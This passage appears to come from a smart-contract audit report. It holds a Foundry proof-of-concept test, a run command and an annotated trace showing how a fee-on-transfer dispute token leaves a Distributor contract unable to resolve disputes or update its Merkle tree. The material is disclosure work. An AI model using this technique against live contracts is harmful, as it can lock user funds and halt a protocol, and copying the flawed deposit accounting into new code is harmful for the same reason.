 numEpoch * EPOCH_DURATION;\n\n        vm.prank(governor);\n        creator.setFeeRecipient(dylan);\n\n        vm.startPrank(guardian);\n        address[] memory tokens = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n        tokens[0] = address(angle);\n        amounts[0] = 1e8;\n        creator.setRewardTokenMinAmounts(tokens, amounts);\n        vm.stopPrank();\n\n        angle.mint(address(alice), 1e22);\n        vm.prank(alice);\n        angle.approve(address(creator), type(uint256).max);\n\n        distributorImpl = new Distributor();\n        distributor = Distributor(deployUUPS(address(distributorImpl), hex\"\"));\n        distributor.initialize(IAccessControlManager(address(accessControlManager)));\n\n        fotToken = new FeeOnTransferToken();\n    }\n\n    function test_submissionValidity() external {\n        uint256 disputeAmount = 1000e18;\n\n        vm.startPrank(governor);\n        distributor.setDisputeAmount(disputeAmount);\n        distributor.setDisputePeriod(1);\n        distributor.setDisputeToken(IERC20(address(fotToken)));\n        distributor.updateTree(MerkleTree({ merkleRoot: keccak256(\"MERKLE_ROOT\"), ipfsHash: keccak256(\"IPFS_HASH\") }));\n        vm.stopPrank();\n\n        fotToken.mint(alice, disputeAmount);\n\n        vm.startPrank(alice);\n        fotToken.approve(address(distributor), disputeAmount);\n\n        uint256 aliceBalanceBefore = fotToken.balanceOf(alice);\n        uint256 distributorBalanceBefore = fotToken.balanceOf(address(distributor));\n\n        vm.warp(distributor.endOfDisputePeriod() - 1);\n        distributor.disputeTree(\"Invalid tree\");\n        vm.stopPrank();\n\n        uint256 aliceBalanceAfter = fotToken.balanceOf(alice);\n        uint256 distributorBalanceAfter = fotToken.balanceOf(address(distributor));\n\n        assertEq(aliceBalanceBefore - aliceBalanceAfter, disputeAmount);\n\n        uint256 expectedFee = (disputeAmount * 100) / 10000;\n        uint256 actualReceived = distributorBalanceAfter - distributorBalanceBefore;\n        assertEq(actualReceived, disputeAmount - expectedFee);\n\n        assertEq(distributor.disputer(), alice);\n\n        vm.prank(governor);\n        vm.expectRevert(\"ERC20: transfer amount exceeds balance\");\n        distributor.resolveDispute(true);\n\n        vm.prank(governor);\n        vm.expectRevert(\"ERC20: transfer amount exceeds balance\");\n        distributor.resolveDispute(false);\n\n        assertEq(distributor.disputer(), alice);\n\n        vm.prank(governor);\n        vm.expectRevert();\n        distributor.updateTree(MerkleTree({ merkleRoot: keccak256(\"NEW_ROOT\"), ipfsHash: keccak256(\"NEW_IPFS\") }));\n\n        vm.prank(governor);\n        vm.expectRevert();\n        distributor.revokeTree();\n    }\n}\n```\n\nRun with:\n```bash\nforge test --match-test test_submissionValidity -vvv\n```\n\n\n### Test Output Trace (Key Sections)\n\n```\n[PASS] test_submissionValidity() (gas: 268485)\nTraces:\n  [308285] C4PoC::test_submissionValidity()\n    ...\n    // Step 1: Alice disputes with 1000e18, but contract only receives 990e18\n    ├─ [33584] ERC1967Proxy::fallback(\"Invalid tree\")\n    │   ├─ [33186] Distributor::disputeTree(\"Invalid tree\") [delegatecall]\n    │   │   ├─ [28549] FeeOnTransferToken::transferFrom(Alice, ERC1967Proxy, 1000000000000000000000 [1e21])\n    │   │   │   ├─ emit Transfer(from: Alice, to: 0x0000...0000, value: 10000000000000000000 [1e19])  // 1% fee burned\n    │   │   │   ├─ emit Transfer(from: Alice, to: ERC1967Proxy, value: 990000000000000000000 [9.9e20])  // Only 990e18 received\n    │   │   │   └─ <- [Return] true\n    │   │   ├─ emit Disputed(reason: \"Invalid tree\")\n    │   │   └─ <- [Stop]\n    ...\n    // Step 2: resolveDispute(true) REVERTS - tries to transfer 1000e18 but only 990e18 available\n    ├─ [7223] ERC1967Proxy::fallback(true)\n    │   ├─ [6812] Distributor::resolveDispute(true) [delegatecall]\n    │   │   ├─ [3683] FeeOnTransferToken::transfer(Alice, 1000000000000000000000 [1e21])\n    │   │   │   ├─ emit Transfer(from: ERC1967Proxy, to: 0x0000...0000, value: 10000000000000000000 [1e19])  // Burns 10e18 fee first\n    │   │   │   └─ <- [Revert] ERC20: transfer amount exceeds balance  // Only 980e18 left, needs 990e18\n    │   │   └─ <- [Revert] ERC20: transfer amount exceeds balance\n    │   └─ <- [Revert] ERC20: transfer amount exceeds balance\n    ...\n    // Step 3: resolveDispute(false) also REVERTS\n    ├─ [7117] ERC1967Proxy::fallback(false)\n    │   ├─ [6706] Distributor::resolveDispute(false) [delegatecall]\n    │   │   ├─ [3683] FeeOnTransferToken::transfer(Governor, 1000000000000000000000 [1e21])\n    │   │   │   ├─ emit Transfer(from: ERC1967Proxy, to: 0x0000...0000, value: 10000000000000000000 [1e19])\n    │   │   │   └─ <- [Revert] ERC20: transfer amount exceeds balance\n    │   │   └─ <- [Revert] ERC20: transfer amount exceeds balance\n    │   └─ <- [Revert] ERC20: transfer amount exceeds balance\n    ...\n    // Step 4: Protocol bricked - updateTree blocked\n    ├─ [902] ERC1967Proxy::fallback(MerkleTree({ ... }))\n    │   ├─ [506] Distributor::updateTree(MerkleTree({ ... })) [delegatecall]\n    │   │   └─ <- [Revert] NotTrusted()\n    │   └─ <- [Revert] NotTrusted()\n    ...\n    // Step 5: revokeTree also blocked\n    ├─ [1974] ERC1967Proxy::fallback()\n    │   ├─ [1584] Distributor::revokeTree() [delegatecall]\n    │   │   └─ <- [Revert] UnresolvedDispute()\n    │   └─ <- [Revert] UnresolvedDispute()\n    └─ <- [Stop]\n```",
